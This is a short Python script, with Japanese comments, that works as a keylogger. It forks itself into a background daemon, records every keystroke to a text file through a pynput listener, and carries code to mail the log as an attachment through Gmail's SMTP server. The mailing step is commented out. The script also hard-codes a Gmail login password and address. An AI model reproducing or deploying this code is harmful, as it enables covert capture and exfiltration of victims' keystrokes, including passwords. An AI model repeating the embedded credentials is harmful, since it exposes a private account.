#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import sys
import time
import smtplib
from email.mime.text import MIMEText
from email.utils import formatdate
from pynput import keyboard

import os.path
import datetime

from email import Encoders
from email.MIMEBase import MIMEBase
from email.MIMEMultipart import MIMEMultipart


count = 0#キー入力されたらインクリメントする


'''
gmailのSMTPサーバにメールを送る
'''
def send(from_addr,to_addrs,msg):
	smtpobj=smtplib.SMTP("smtp.gmail.com",587)
	smtpobj.starttls()
	smtpobj.login(from_addr,"M0rn1ng-1812")
	smtpobj.sendmail(from_addr,to_addrs,msg.as_string())
	smtpobj.close()


'''
　添付ファイル付きメッセージを作成
'''
def create_message(from_addr, to_addr, subject, body, file_obj):
        """
        Mailのメッセージを構築する
        """
        msg = MIMEMultipart()
        msg["Subject"] = subject
        msg["From"] = from_addr
        msg["To"] = to_addr
        msg["Date"] = formatdate()

        body = MIMEText(body)
        msg.attach(body)

        # 添付ファイルのMIMEタイプを指定する
        attachment = MIMEBase("application","vnd.ms-excel")
        # 添付ファイルのデータをセットする
        attachment.set_payload(file_obj.read())
        file_obj.close()
        Encoders.encode_base64(attachment)
        msg.attach(attachment)
        attachment.add_header("Content-Disposition","attachment", filename="key_logger.txt")

        return msg


'''
 キー入力されたときのイベントハンドラー
'''
def on_press(key):
	f = open('testest.txt','a')
	
	try:	
		if key.char!=None:
			'''
			　入力キーが数字やアルファベットの場合
			'''
			f.write(key.char)
		else:
			'''
			  日本語変換キーが入力されたときスペースを出力
			'''
			f.write(" ")	
	except AttributeError:
		'''
		  ESCやSPACEキーの場合スペースを出力
		'''
		f.write(" ")
	finally:
		global count 
		count+=1
		if count==100:
			f.write("\n")
			count=0
			'''
			f.close()
			f=open("testest.txt")
			from_addr = "nakajima1812@gmail.com"
    			to_addr = "nakajima1812@gmail.com"
    			subject = "sample" 
    			body = "test body"
			#msg=create_message(from_addr,to_addr,subject,body,f)
			#send(from_addr,[to_addr],msg)
			'''			
		f.close()

def createDaemon():
	pid = os.fork()
	if pid > 0:
		#親プロセスの場合PIDをテキストに出力して終了
		f2 = open('oredaemon.pid','w')
		f2.write(str(pid)+"\n")
		f2.close()
		sys.exit()
	if pid == 0:
		#子プロセスの場合キーボードにハンドラーを登録
		with keyboard.Listener(on_press=on_press) as listener:
			listener.join()

if __name__ == '__main__':
	createDaemon()
